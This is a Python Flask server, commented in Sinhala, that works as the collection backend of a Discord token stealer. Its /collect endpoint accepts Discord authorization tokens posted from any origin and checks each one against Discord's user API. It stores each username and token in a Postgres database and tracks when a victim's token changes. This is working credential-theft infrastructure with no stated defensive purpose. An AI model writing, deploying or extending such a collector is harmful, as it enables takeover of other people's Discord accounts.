from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
import os
import requests

app = Flask(__name__)
CORS(app)

DB_URL = os.environ.get('DATABASE_URL')

def get_db_connection():
    return psycopg2.connect(DB_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    # පැරණි Table එක ඉවත් කර අලුත් එක සෑදීම
    cur.execute("DROP TABLE IF EXISTS tokens;")
    cur.execute("""
        CREATE TABLE tokens (
            username TEXT PRIMARY KEY,
            token TEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

# ඇප් එක පටන් ගන්නා විට වරක් පමණක් Table එක සකසන්න
init_db()

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    token = data.get('token')
    
    # 1. Discord වෙතින් Username ලබා ගැනීම
    headers = {'Authorization': token}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    
    if r.status_code != 200:
        return jsonify({"status": "error", "message": "Invalid Token"}), 401
    
    username = r.json().get('username')

    # 2. Database මෙහෙයුම්
    conn = get_db_connection()
    cur = conn.cursor()
    
    # දැනටමත් එම username එක ඇත්දැයි බැලීම
    cur.execute("SELECT token FROM tokens WHERE username = %s", (username,))
    old_data = cur.fetchone()
    
    status = "Not Changed"
    if not old_data:
        # අලුත් පරිශීලකයෙක් නම් insert කරන්න
        cur.execute("INSERT INTO tokens (username, token) VALUES (%s, %s)", (username, token))
        status = "New Registration"
    elif old_data[0] != token:
        # පරණ ටෝකනයට වඩා වෙනස් නම් update කරන්න
        cur.execute("UPDATE tokens SET token = %s, updated_at = CURRENT_TIMESTAMP WHERE username = %s", (token, username))
        status = "Changed"
    
    conn.commit()
    cur.close()
    conn.close()
    
    return jsonify({
        "status": status,
        "username": username,
        "new_token": token,
        "old_token": old_data[0] if old_data else "None"
    }), 200

if __name__ == '__main__':
    app.run()
